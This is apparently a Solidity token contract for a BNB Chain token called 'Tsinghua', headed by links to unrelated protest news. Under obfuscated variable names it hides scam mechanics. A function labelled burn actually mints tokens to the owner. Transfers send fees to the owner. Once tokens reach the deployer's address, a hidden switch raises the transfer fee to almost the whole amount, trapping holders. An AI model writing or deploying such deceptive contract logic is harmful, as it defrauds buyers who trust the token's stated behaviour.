/**
 *Submitted for verification at BscScan.com on 2022-11-27
*/

/////////////////////////////////////////////////////////////////////////////////////////////////////////
//https://twitter.com/WallStreetSilv/status/1596687049901637632
//https://edition.cnn.com/2022/11/26/asia/xinjiang-urumqi-china-lockdown-protests-intl-hnk/index.html
/////////////////////////////////////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity =0.6.5;
contract Tsinghua {
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "Tsinghua";
address private  FZRGQM = address(0);
uint8 public constant decimals = 18;
address private  TISOVW = address(0);
address private  DQXSRU = address(0);
uint256 public constant DNBBBS = 99999;
uint256 private  HQQJHZ = 100000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  BGYMVD = 10000000000000;
uint256 private  DDDCZQ = 1000000000000000;
uint256 private  CVWCOC = 10000000000;
uint256 private  WNZCYJ = 1000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  SSFGKN = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  ZLUKAW = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  HRYZKS = address(0);
string public  name = "Tsinghua";
uint256 private  ARJXJF = 1000000000000000000;
address public owner;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getBGYMVD() private returns (uint256) {
return BGYMVD;
}

function _getWNZCYJ() private returns (uint256) {
return WNZCYJ;
}

function _getHQQJHZ() private returns (uint256) {
return HQQJHZ;
}

function _getDDDCZQ() private returns (uint256) {
return DDDCZQ;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tMYGTOE 0");
require(spender != address(0), "fMYGTOE 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getCVWCOC() private returns (uint256) {
return CVWCOC;
}

function _getSSFGKN() private returns (address) {
return SSFGKN;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getTISOVW() private returns (address) {
return TISOVW;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
FZRGQM = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getARJXJF() private returns (uint256) {
return ARJXJF;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MYGTOE");
require(to != address(0), "MYGTOE");
require(amount <= balanceOf[from], "MYGTOE");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DNBBBS/ZLUKAW ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==FZRGQM){
ZLUKAW = DNBBBS+2;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getHRYZKS() private returns (address) {
return HRYZKS;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getDQXSRU() private returns (address) {
return DQXSRU;
}


}